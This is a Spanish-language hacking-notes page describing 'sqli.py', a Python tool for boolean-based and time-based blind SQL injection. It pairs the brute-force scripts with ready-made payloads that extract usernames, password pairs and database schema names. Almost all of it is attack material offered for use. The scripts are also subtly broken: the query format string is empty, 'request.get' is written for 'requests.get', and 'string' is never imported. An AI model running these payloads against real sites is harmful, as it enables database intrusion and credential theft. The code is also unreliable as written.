# sqli.py

***

* Tags: #herramientas #python #hacking #scripting #sql

***

**Sqli.py** es un script encargado de realizar tipos de \[\[Blind SQL Injection]], mediante peticiones al servidor apreciando las diferentes respuestas para conseguir distinta información.

## \[\[Boolean-based Blind SQL Injection]]

```python
#!/usr/bin/python3

import requests   # Para poder tramitar peticiones
import signal
import sys
import time
from pwn import *    # Si no está instalado pip3 install pwn para jugar con barras de progreso y un montón de cosas

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url = "<URL>"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Datos extraídos")

	extracted_info = ""
	
	for position in range(1,50):   #Posición del carácter
		for character in range(33,126):   #Números en ascii de todas las letras printables
			sqli_url = main_url + "" % (position, character)

			p1.status(sqli_url)

			r = request.get(sqli_url)     #Guarda la respuesta de la petición get creada anteriormente
		
			if r.status_code == 200:      #Si obtenemos un dato correcto, lo añadimos al array de información extraída
				extracted_info += chr(character)
				p2.status(extracted_info)
				break

if __name__ == '__main__':      #Para definir el flujo del programa y comience por el main

	makeSQLI()
```

Dentro del bucle anidado, podemos añadir distintas peticiones para obtener distinta información:

```
#Para conseguir el nombre del usuario cuyo id es 1
?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d) 

#Para conseguir todos los nombres de usuarios existentes en la tabla users (los concatena con comas con group_concat)
?id=9 or (select(select ascii(substring(select group_concat(username) from users),%d,1)) from users where id = 1)=%d)

#Para conseguir todas las contraseñas de usuarios existentes en la tabla users
?id=9 or (select(select ascii(substring(select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)

#Para conseguir todas las bases de datos existentes en la base de datos
?id=9 or (select(select ascii(substring(select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)
```

## \[\[Time-based Blind SQL injection]]

```python
#!/usr/bin/python3

import requests   # Para poder tramitar peticiones
import signal
import sys
import time
from pwn import *    # Si no está instalado pip3 install pwn para jugar con barras de progreso y un montón de cosas

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url = "<URL>"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Datos extraídos")

	extracted_info = ""
	
	for position in range(1,50):   #Posición del carácter
		for character in range(33,126):   #Números en ascii de todas las letras printables
			sqli_url = main_url + "" % (position, character)

			p1.status(sqli_url)

			time_start = time.time()

			r = request.get(sqli_url)     #Guarda la respuesta de la petición get creada anteriormente

			time_end= time.time()

			if time_end - time_start > 0.35:      #Si obtenemos un dato correcto, lo añadimos al array de información extraída
				extracted_info += chr(character)
				p2.status(extracted_info)
				break

if __name__ == '__main__':      #Para definir el flujo del programa y comience por el main

	makeSQLI()
```

Dentro del bucle anidado podemos hacer uso de diferentes querys para conseguir distinta información segun nos interese:

```
#Para conseguir el nombre de la base de datos actual 
?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)

#Para consguir el nombre del usuario cuyo id es 1 de la tabla users
?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)

#Para consguir el nombre de las bases de datos existentes en el sistema
?id=1 and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d,sleep(0.35),1)
```
